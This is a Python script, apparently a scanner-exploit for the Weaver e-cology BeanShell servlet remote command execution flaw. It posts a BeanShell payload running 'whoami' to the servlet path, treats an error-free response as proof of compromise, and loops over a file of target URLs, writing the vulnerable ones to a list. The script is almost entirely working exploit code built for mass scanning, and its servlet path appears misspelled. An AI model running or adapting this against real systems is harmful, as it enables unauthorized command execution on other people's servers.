import requests
import argparse

def verify(url,payload):
    #Furl=url+"/bshservlet/eval" #实验环境
    Furl=url+"/weaver/bsh.servlet.BshServle"
    with open("vlun_list.txt",'a') as vList:
        try:
            res = requests.post(Furl, data = payload)
            #print(res.text)
            if res.status_code == 200 :
                if "Error:" not in res.text:
                    print(url + " is a vlun [Verify Success!]\n")
                    #print(res.text)
                    vList.write(url+'\n')
                else:
                    print(url + "Verify Failed! not a vlun\n")
            else:
                print(str(res.status_code)+url+" Verify Failed! not a vlun \n")
        except Exception:
            raise Exception("Connet Failed!")



def ecologyexp(urls,mode): 
    payload={"bsh.script":"exec(\"whoami\")","bsh.servlet.output":"raw"}
    if mode == '1':
        verify(urls,payload)
    elif mode == '2':
        with open(urls) as uFile:
            for url in uFile.readlines():
                try:
                    verify(url,payload)
                except Exception as e:
                    print(e)
                continue    
    else:
        pass

parser = argparse.ArgumentParser(description='e-cology verify',epilog="python e-cology-EXP.py -u url -m 1 || python e-cology-EXP.py -ul url.txt -m 2")
parser.add_argument('--url', '-u', help='url 属性，需检测站点的url')
parser.add_argument('--mode', '-m', help='mode 属性，单点检测||批量检测{1:url,2:urlList}', default='1')
parser.add_argument('--urlList', '-ul', help='urlList 属性，url列表')
parser.add_argument('--level', '-lv', help='level 属性，普通检测||高级检测{1:normal,2:pro}', default='1')
args = parser.parse_args()



if __name__ == '__main__':
    with open("vlun_list.txt",'w') as vF:
        vF.write("vlun_list\n")
    
    try:
        if args.urlList is not None:
            ecologyexp(args.urlList,args.mode)
        else:
            ecologyexp(args.url,args.mode)
    except Exception as e:
        print(e)